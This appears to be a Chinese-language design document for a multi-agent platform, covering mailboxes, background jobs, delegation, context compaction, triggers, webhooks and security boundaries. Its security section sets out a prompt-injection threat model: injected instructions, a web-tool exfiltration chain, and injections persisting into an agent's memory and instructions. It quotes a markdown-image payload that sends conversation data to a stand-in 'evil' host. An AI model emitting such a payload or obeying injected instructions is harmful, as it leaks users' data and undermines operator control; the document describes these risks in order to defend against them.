- **续跑接管**：一次运行最终失败后，新到的信件会唤醒新的运行；它从失败处续跑（历史末尾是失败那次保存的步骤），也接管那次运行处理过的信件——推送由它做（委派的失败已经交回过，不再交回）。之后再重试那次失败的运行时，它没有可交给模型的、历史末尾也不是它保存的，什么都不做。
- **唤醒**（`wake_in`，唯一规则）：会话里有排队的信件、没有排队或运行中的运行，并且有信件在最近一次运行之后才到；会话停在提问上时，只有回答或用户的新消息能唤醒（见「向用户提问」）。最后一条保证最终失败的运行不会因为同一批信件被无限重新投递：它被重试、或之后新信件到达时再处理。调用方：投信时（`post_in`）、一次运行结束时（它的收尾事务里，这时队列还没把它记为完成，所以把它排除在「忙」之外，也不做「之后才到」的判断：剩下的信件一定要有下一次运行）、定期对账（`MailReconciler`，每 30 秒，兜住投信时事务失败、进程重启这类没有及时唤醒的情况）。
- **私有 thread** 只收发问方的问题（其他种类的信件拒绝），由发问方内联驱动，不被唤醒（见第 4 节）。
- **记录**：已处理与被丢弃的信件只作记录（内容已随那一步的消息保存）；排队查询只看 `state = queued` 的行（部分索引）。会话接口给出排队中的信件（界面上显示为待处理）和最近一次停止丢弃的信件（划掉显示）。

### 后台任务（`runtime/jobs.py`）

做法同 Claude Code 的后台 bash：`run_shell(background: true)` 立即返回任务 id，命令在后台跑，不占住运行、不设时限（同步的 `run_shell` 仍有上限，因为它占着运行）。任务属于发起它的会话（`jobs` 表），它的消息都作为事件信件（来源 `job:<id>`）投进这个会话的信箱：

- **结束**：进程退出（或被 `job_kill` 结束）时，在同一个事务里记下状态与退出码并投递完成事件（退出码、运行时长、命令、最后几行输出、日志路径）。用户是否在等完成事件随发起任务的那次运行（`jobs.awaited`）：用户在等那次运行，处理完成事件的运行也推送。
- **运行中检查**：每 `runtime.job_check_seconds`（默认 60 秒）给每个运行中的任务投递一个检查事件（已运行多久、最后几行输出），不推送；agent 据此决定继续等还是 `job_kill`。这个任务上一条事件还在信箱里排着时不再发，事件不会在等用户回答提问时堆积。不限制频率与任务数（按用户决定）。
- **输出**：stdout 与 stderr 合并，按行脱敏（注入的 secret 替换为 `[secret:KEY]`）后写进 agent 工作目录的 `jobs/<id>.log`，agent 用 `read_file` 读完整输出，`job_status` 看状态与最后几行。
- **进程**：自成进程组（`shell.spawn_bash`，与同步 shell 共用环境与 secret 注入），`job_kill` 与关停杀掉整棵进程树。
- **重启**：正常关停时杀掉所有后台任务；启动时（worker 开始之前）把还记为运行中的任务记为被中断，并投递事件告诉 agent，不接管旧进程。
- **停止**：用户停止会话时它的后台任务一起结束，直接记下结局、不再投信（见第 2 节「停止会话」）。
- **边界**：私有 thread（发问方在同步等它的回答，只收问题）、反思与临时 agent（没有会话）没有信箱可以接收事件，不能开后台任务，`job_*` 工具在没有会话的运行里不出现；有后台任务在跑的会话不能删除（进程不随会话结束，结束时也无处投递），先结束它们。

### 异步 agent 回报（`runtime/reports.py`）

做法同 Claude Code 的后台子 agent：`delegate_task(report_back: true)` 不等结果，thread 处理这封委派信件的运行结束时，结果作为事件信件（来源 `thread:<子会话 id>`）投进发起委派的会话。委派信件带 `report_to`（父会话，以及用户是否在等发起委派的那次运行，`conversation.ReportTo`），只在这里写入。

- **每个委派只交回一次**（`reports.settle_in`，唯一出口）：交回结局的同时撤掉委派信件上的交回地址，之后的结局不再交回，检查也随之停止。
- **完成或被停止**：在 thread 那次运行的收尾事务里交回（交回地址在那时从库里读，可能已被撤掉），内容是 thread 的回答（被停止时说明停止了、附上停止前说的话）。thread 的回答不直接推送给用户：交给父 agent 处理，父会话处理它的运行按 `awaited` 推送，不重复打扰。委派信件还排着、没有运行处理时 thread 被停止，同样交回「被停止」。
- **最终失败**：任务处理器接口有一个与成功时 `Commit` 对称的收尾点：task 最终失败（不再重试）时，队列在记下失败的同一个事务里调用处理器的 `failed_in`。运行用它把失败原因交回：它处理过的委派信件，以及交给过它、还排着的——运行在第一次保存之前就失败（组装指令、连接 MCP、复制附件）时，开头取走的信件一直排着，它们不晚于这次运行，不会再有运行因为它们被唤醒（`mailbox.handed_to`，与唤醒的「之后才到」同一条规则）；它们随失败交回一起记为被丢弃，不会在之后的运行里被悄悄执行。运行开始之后才到的委派不动，它们会唤醒新的运行、交回真实的结局。其他种类的 task 没有等着结果的一方，失败只需可见。收尾钩子自己失败时（整个事务回滚），worker 记下钩子的失败后不带钩子再记一次：task 一定落到 failed，不会卡在 running 占住 lane 直到重启；没交回的结果见那条 error 日志。
- **运行中检查**：与后台任务同一个节奏（`runtime.job_check_seconds`，同一个检查循环），给委派信件还在排队、或处理它的运行还没结束的 thread 向发起方发检查事件（不推送），同一个 thread 已有事件在信箱里时不再发；不需要了就用 `stop_thread` 停止它（排队中或运行中都可以：结束它正在进行的运行、清空它的信箱，同停止会话）。
- **停止父会话**：父会话被用户停止时，它 `report_back` 委派出去、还没交回的 thread 一起停止，不再交回（见第 2 节「停止会话」）。
- **边界**：私有 thread 的发问方在同步等回答，不能用 `report_back`；公开 thread 在父会话删除后仍然保留，那时结果无处可交，记下日志后跳过。

## 5. 上下文压缩

与模型提供方无关的统一机制（`runtime/compaction.py`）。pydantic-ai 只为 Anthropic 与 OpenAI Responses 提供原生压缩，`openai` 兼容接口和 Gemini 没有，按提供方分支会产生两套语义，所以统一自己实现：

- **触发**：一次运行结束时，最后一次模型请求的输入 token（pydantic-ai 已计入缓存 token）超过 `runtime.compaction_threshold_tokens`，在它的收尾事务里投递 `compaction` task；也可在会话页手动触发。它与运行同一 lane，只在两次运行之间执行，同一 session 最多一个待执行的压缩。模型不返回 usage（部分 OpenAI 兼容服务流式时如此）时记 warn 日志，自动触发对该模型失效。
- **执行**：按产生消息的运行分组（`messages.task_id`），把最近 `runtime.compaction_keep_turns` 次运行之前的消息连同上一份摘要交给该 agent 的模型总结，写入 `compactions` 表（`through_message_id` + `summary`）。切点总在两次运行之间，工具调用与其返回不会被拆开：一次运行停在挂起的调用上（`ask_user` 等回答）时，它和给出结果的后续运行算作一组，切点不会落在中间。单次只取总长不超过上限的最早若干组，不截断内容；剩余部分在同一事务里续排下一次压缩，直到收敛。没有可压缩的运行时什么也不做。
- **使用**：发给模型的上下文 = 最新摘要（放进 instructions）+ 切点之后的原始消息。原始消息不删除，UI 显示完整原文并标出压缩点；反思读取的仍是原始消息。

## 6. 数据库迁移

Alembic 管理表结构（`src/muliao/migrations/`，随包分发），启动时自动升级到最新版本。整个升级在一个真正的事务里：pysqlite 默认只在 DML 前隐式开事务、DDL 逐条自动提交，所以迁移使用独立连接，驱动设为 autocommit 并显式 `BEGIN IMMEDIATE`，任何失败都完整回滚。SQLite 改表用 batch 模式（建新表-拷数据-删旧表），迁移连接在建立时关闭外键以免删旧表时级联删除子表数据，提交前执行 `foreign_key_check`，有违例则回滚。`tests/test_migrations.py` 保证迁移后的结构与模型定义一致。

首次部署之前不积累迁移历史：所有结构变化都直接改唯一的初始版本（重新 autogenerate）。首次部署之后，每次结构变化新增一个迁移，已部署的数据只通过迁移升级，不删库。

## 7. 进化机制

### Skill
agent 在任何一轮都可以主动 `write_skill`。公共 skill 对所有 agent 可见；私有 skill 只对自己可见，同名时私有遮蔽公共。

**归属与合并规则（skill、MCP server、secret 共用，只在 `ownership.visible` 实现一次）**：资源归属某个 agent（私有）或公共；agent 看到自己的私有资源加上公共资源，同名时私有遮蔽公共，其他 agent 的私有资源不可见。prompt 不是按名称合并，而是公共 prompt 与 agent 指令拼接（见下）。「私有」是可见范围和命名空间的划分，不是安全隔离：agent 能执行任意命令、读到数据库与 vault 主密钥（见第 9 节）。

### Prompt（公共 prompt 与 agent 指令）
agent 的指令是资源仓库里的 `agents/<id>/PROMPT.md`，公共 prompt 是 `public/PROMPT.md`（合并进所有 agent，放在各自的指令之前）。当前生效的就是文件内容（`agents` 表里没有指令列），读写都经过 `PromptStore`；修改即提交一版并记录作者（`user` 或做出修改的 agent），回滚即把旧版内容作为新的一版写入，历史只增不改。内容未变时不提交；空的公共 prompt 等同于没有（清空也提交一版空文件，历史里不会出现「文件不存在」的版本）。指令与记忆的历史和恢复通过 `/api/resources/{prompt|memory}/history|restore`，界面在公共指令页和 agent 的配置、记忆标签里；接口只列最近 50 版，更早的仍在仓库里。

### Memory
agent 私有、有长度上限（`memory_max_chars`），每轮全文注入 instructions。

### 强制反思（reflection）
反思可以更新记忆、私有 skill（有 `public_skills` 时也可写公共 skill），以及自己的指令（`instructions_replace`，只做小而准的修改）；这三者都是资源仓库里的文件，每次修改都有版本，用户可回滚。
- 计数在 **agent** 上：每完成一次产生了消息的运行，`agents.turns_since_reflection += 1`。达到该 agent 的 `reflect_every` 时，在同一事务里清零计数、把检查点推进到当前最大消息 id，并投递一个 reflection task，载荷是消息 id 区间 `(from_id, to_id]`。
- 选择 agent 级而不是 session 级：定时触发每次都是一个新 session，只有一次运行，按 session 计数永远到不了阈值。
- ReflectionHandler 把这个区间内该 agent 所有会话消息渲染成文字记录，连同固定的反思提示交给同一个 agent 运行，只开放自我改进的工具（记忆、私有 skill、自己的指令，加上该 agent 已有的写公共 skill）。没有需要修改的内容也要走完并给出结论。
- 反思的完整消息和结论写入 `reflections` 表，可在 UI 查看；不进入任何 session 的历史。

## 8. 触发源

触发点有两类：用户在网页发起对话，以及触发器。agent 之间的委派是 agent 内部能力，在父会话下开 thread（第 4 节）。

**统一入口**：用户消息、触发器、agent 委派都是同一件事——把一段内容投进某个 agent 的某个会话的信箱。各来源只做适配（鉴权、触发时机、组装内容），然后构造一个 `Inbound` 交给 `conversation.receive`：

| 字段 | 含义 |
|---|---|
| `origin` / `origin_ref` | 来源与具体发送方：用户（无）、触发器 id、委派方（父）会话 id；与会话上的同名字段是同一个概念（会话记的是发起它的那一个事件的来源） |
| `content` | 交给 agent 的内容 |
| `session` | 已有会话的 id（在其中继续），或 `NewSession`（新建：agent、标题，委派时还有父会话、thread 名、是否私有） |
| `awaited` | 用户是否在等它的回答（处理它的运行结束时推送） |
| `attachments` / `answers` / `report_to` | 用户随消息发送的文件、对挂起提问的回答（只有用户会带）；结果交回的会话（只有 `delegate_task(report_back)` 会带） |

`receive` 是外部来信投进信箱的唯一入口（代码里的生产者——后台任务、thread 交回、运行中检查——直接 `mailbox.post_in`）；新建会话也只有 `create_session` 一处实现。**续写规则**：用户可以在任何非私有会话里继续；其他来源只能续写自己发起的会话（会话的来源与发送方都一致，委派会话的发送方就是它的父会话），否则 403。发送方身份是触发器 id（AUTOINCREMENT，删除后不复用）或父会话 id。

是否推送由信件的 `awaited` 决定（唯一来源），由投信的入口设置：

| 入口 | session 策略 | `awaited` |
|---|---|---|
| 用户发起 / 回复 | 新建；回复沿用（私有 thread 只读） | 是（iOS 要求每个 push 都展示通知，所以页面可见时也会弹） |
| 触发器 | 默认每次新建，`origin_ref` 记触发器；带回会话 id 的事件在原会话里续写（只能续写本触发器发起的会话） | 否，需要通知时 agent 调 `notify_user` |
| `delegate_task` | 父会话下的公开 thread，同名续聊 | 是；`report_back` 时否（结果交回父会话） |
| `ask_agent` | 父会话下的私有 thread，同名续聊（内联执行，不走 `receive`） | 否（回答作为工具结果交给发问方） |

**触发器**：具名、持久的事件来源（`triggers` 表）。公共字段只有名称、agent、处理说明、启用与最近一次触发的记录；怎么被触发由 `kind` 决定，**只在代码里多态实现**，表里不为某种方式开专门的列：`config`（JSON）是这种方式的配置，`state`（JSON）是这种方式自己维护的运行状态。每种方式分两部分：

- `TriggerKind`（纯逻辑，注册给 `TriggerService`）：校验并规范化 `config`、由配置推导 `state`、给出展示用的运行状态（不含凭证）。推导在创建、修改配置与停用后重新启用时进行，由 `TriggerService` 合并进已有 `state`（实现不负责保留与配置无关的部分，如 token 摘要）；
- 激活机制：怎么被触发，都只调用 `TriggerService.fire`（唯一出口，先跑前置检查，见下）组装成事件交给统一入口；需要感知触发器变化的激活机制各自 `subscribe()` 一个通知，互不干扰；某种方式专有的接口放在它自己的 API 模块（如 `api/webhook.py`）。

新增一种方式（例如消息队列）= 一个 `TriggerKind` + 它的激活机制（消费循环），在组合根注册并启动；表、工具、统一入口与界面的通用部分都不用改（界面对未知方式用 JSON 编辑配置）。现有两种：

| kind | config | state | 激活机制 |
|---|---|---|---|
| `schedule` | `{"cron": "<5 段表达式>"}`，按配置的时区解释 | `next_run_at` | `ScheduleRunner` 循环：到点先推进下次时间并提交，再调用 `fire`（前置检查不能占着事务；进程恰好死在两者之间时这一次被跳过，至多一次）；上一次触发的会话仍有未完成的运行时跳过本次；停机期间错过的只补一次，暂停期间错过的不补（重新启用时从当时算起）；触发前按最新的行重新判断（列出之后被删除、停用或改了配置就跳过）；触发被拒绝时停用并记 `last_error` |
| `webhook` | `{}` | `token_hash` | `Webhooks`：`POST /api/hooks/{name}[?session_id=]` 凭 token 鉴权 |

**前置检查**（`triggers/precheck.py`，所有触发方式共用，触发器的公共字段 `precheck`）：做法同 Hermes 的 script / monitor 模式——触发前先跑一条便宜、确定性的命令，有事才调用 agent，没事不花模型调用。命令在该 agent 的工作目录里用 `bash -o pipefail` 执行（管道里任何一步失败都算检查失败：`curl … | jq` 里 curl 失败时 jq 照样退出 0，否则故障会变成静默的「没事」；与 `run_shell` 共用 `runtime/shell.py`：最小环境变量、按 key 注入 secret、输出里的 secret 替换掉、超时杀进程组），stdin 是原始事件内容（webhook 请求体，定时与手动为空），在数据库事务之外执行，时限 `runtime.precheck_timeout_seconds`（默认 30 秒：webhook 的调用方在同步等它，检查本该便宜），这个时限写进 `trigger_create` 的工具说明，agent 写检查脚本时知道上限（包括重试在内）。同一轮到期的定时触发器并发执行，一个慢的检查不拖住其他触发器。退出码 0 时按 `fire_when` 决定（`decide`，纯逻辑）：
- `output`（默认）：输出非空就触发，输出作为事件内容交给 agent（替换原始事件，可借此过滤、裁剪）；为空不触发。增量由命令自己做（游标存在工作目录）。
- `changed`：与上一次成功检查的输出（存在触发器的 `precheck_output`）逐字比较，变了才触发，交给 agent 的是统一 diff 加完整输出（所以实际可用的输出上限约为事件上限的一半）；命令只需打印当前状态。第一次运行只记基线、不触发（Hermes 首轮会白调一次模型）。修改前置检查时清空基线。
- 非 0 退出、超时、输出（或 diff 加输出）超过事件上限、secret 不可见：检查本身失败，不触发，原因记在 `last_error`，触发器保持启用（脚本的故障往往是暂时的）；从正常变为出错时发一条通知（不调用模型，记在通知页，见下文「通知」），之后持续出错不再重复推送，检查成功即清除。webhook 的外部调用方只收到 502，看不到原因（可能含脚本的 stderr）。
- 检查期间触发器被删除、停用或改了检查，这次结果作废，成功与失败都一样（旧命令的失败不会记到新配置上）。同一个触发器的两次检查恰好并发（如手动运行撞上定时）时，后提交的以先提交的输出为基线，最坏多触发一次，自然收敛，不加锁。`last_checked_at` 记最近一次检查的时间，让用户看到「在检查、只是没事」。
- 不提供 Hermes 的 no_agent（输出原样推送、不经过 agent）：它绕过「一切都经过会话」，推送的内容不属于任何会话；需要省模型调用时用 `changed` 只在变化时叫 agent。

任何触发器都可以在界面上或用 `trigger_run` 立即运行一次（不带事件内容）；有前置检查时同样先跑检查，可以用来测试整条链路。事件内容（若有）原样附在处理说明之后：

```
<处理说明>

<event>
<请求体>
</event>
```

**webhook**：
- 带 `Authorization: Bearer <token>`，响应 `{"session_id": ...}`；请求体为 UTF-8 文本，最多 256 KiB。
- 不走登录 cookie，**先鉴权再读请求体**：未鉴权的调用方不能让进程读入任何内容；请求体按字节上限分块读取，超限返回 413。触发器不存在、不是 webhook、还没有 token、token 不匹配，都返回同一个 401，不暴露哪些名称存在；停用的返回 409；续写不是本触发器发起的会话返回 403。
- token 是我们签发给外部系统的凭证，事实来源是触发器自己：`state` 里只存 SHA-256，明文只在生成时返回一次，**只能由用户在界面上生成**（agent 创建的 webhook 在用户生成 token 之前收不到事件）。不放进 vault——vault 存的是外部系统发给我们的凭证。
- 不校验各平台自己的签名格式（GitHub、Slack 等各不相同）。需要时由发送方把 token 放进 Authorization 头，或在中间加一层转发。

**通知**（`delivery/base.py`）：运行的回答给在等它的用户（处理过的信件有 `awaited`）、agent 调 `notify_user`、前置检查告警、推送测试，都经 `Notifier.enqueue_in` 在业务事务里写一条 `notifications` 行并排一个只带 `notification_id` 的 deliver task。DeliverHandler 投递时读出通知和当时的未读数，Web Push 的载荷带上这个数，Service Worker 收到后设置应用图标角标（Badging API，iOS 16.4+ 主屏应用）；应用在打开、回到前台、收到 deliver 事件和标记已读之后从服务端重新取未读数，刷新导航上的数字与角标。已读规则：打开通知页标记到列出的最新一条为止（之后才到的保持未读）；打开会话同时标记指向它的通知。通知随它指向的会话删除；系统通知点开进通知页，所以前置检查告警在检查恢复、`last_error` 清除之后仍看得到。

通知只有 Web Push 一种渠道。不支持主动推送的外部消息源（例如只能拉取的 Slack 未读）用定时触发器拉取：例如每分钟让 agent 通过 Slack MCP（或 skill 中的脚本 + vault token）读取未读消息，游标由 agent 存在自己的工作目录。

## 9. 安全边界

**威胁模型：agent 与运行服务的系统用户同等可信。** agent 能执行任意 shell 命令，因此能读到服务能读到的一切——包括配置文件里的 `vault.key` 与 LLM API key、数据库文件。下面的措施只防止 secret **意外**进入对话记录、日志和前端，不防 agent 本身：

能缩小的是**提示注入的影响面**：处理外部事件或网页内容的 agent 用 `tool_groups` 只开放它需要的工具组（例如只开 `notify`），这样即使输入里带有恶意指令，它也删不了 agent、改不了公共指令和公共 skill（两者都会进入所有 agent 的 instructions）、用不了 MCP、动不了 vault 和触发器。下面这些组**任何一个都等同于全部权限**，只能给可信的 agent：`workspace`（shell）、`temp_agent`（临时 agent 自带 shell）、`delegation`（借目标 agent 自己的完整工具组之手）、`agents`（可以给自己加组）、`triggers`（可以让任意 agent 带着任意说明定时运行）、`mcp_admin`（可以添加运行任意命令的 stdio MCP）。`public_skills`、`mcp`、`vault` 按各自的影响判断。`web` 本身就是不可信内容的入口（搜索结果与网页正文），也是外发通道：抓取的 URL 可以带上对话里的任何内容，发给搜索服务与目标站点。所以「只开 `notify` + `web`」看似很窄，对处理不可信输入的 agent 已经是一条完整的外泄链路，这类 agent 不应选 `web`；配置了 `[web]` 后新建 agent 默认也包括它。

注入还可能**持久化**：记忆、私有 skill 与自己的指令总是开放（不受 `tool_groups` 限制），处理不可信输入的 agent、以及读取含不可信输入的转录的反思，可能把注入的内容写进它们，之后该 agent 的每次运行都会带着它。影响限于这个 agent 自己（工具组不变，不能越权），但指令在 system prompt 里的权威性比记忆高。缓解手段是版本历史与作者记录：界面上能看到每一版是谁改的，随时回滚。

- shell 只继承少量环境变量（`PATH`、`HOME` 等）；
- `run_shell(secrets=[KEY])` 输出中的 secret 明文被替换为 `[secret:KEY]`（逐字匹配，编码后的输出不会被替换）；
- `vault_set` 的参数在持久化前脱敏；但用户在 prompt 里直接写的明文会原样保存并在后续轮次发给模型——敏感值应在 UI 的 Vault 页录入。

如需真正隔离，应让服务以独立系统用户运行、把配置文件与数据目录放在 agent 可读范围之外并限制权限，或把 shell 放进沙箱。

其他边界：

- Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。登录接口未做频率限制，部署在公网时应在反向代理层限流。
- 文件下载：与界面同源、带着登录 cookie，内容按不可信处理（agent 能写任意 HTML/SVG）。响应一律带 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`，只有 png/jpeg/gif/webp 按 inline 返回，其余一律 `Content-Disposition: attachment`，不在本站执行（同 Matrix 媒体下载）。
- 回答里的图片：前端只渲染指向 `/api/files/` 的图片，外链图片显示为普通链接。否则被注入的模型输出 `![](https://evil/?d=<对话内容>)`，打开会话时浏览器就会自动把数据发出去。
- Vault：Fernet 加密，主密钥来自配置 `vault.key`，缺失或格式错误时拒绝启动。
- 配置文件：唯一配置来源（`config.example.toml`），未知键直接报错，避免拼写错误被静默忽略。
- 日志不打印 secret 值与 token。

## 10. 部署形态与边界

- **单进程**：事务串行化与 task 领取依赖进程内锁，所以只跑一个进程。这不影响 agent 并发：worker 同时执行 `runtime.worker_concurrency` 个 task（不同 session、不同 agent 并行，同一 session 串行）。模型调用与工具执行都是异步 IO，不占事务锁。
- **外部消息**：能主动推送的外部系统接入 webhook 触发器；只能拉取的由定时触发器拉取（见第 8 节）。
- **上下文压缩的覆盖范围**：只在两轮之间压缩。单轮内工具调用极多导致上下文超限时，该轮失败可见；在会话页点「压缩」后重试该轮即可。不自动识别各提供方的超限错误，因为错误格式各不相同，无法可靠识别。
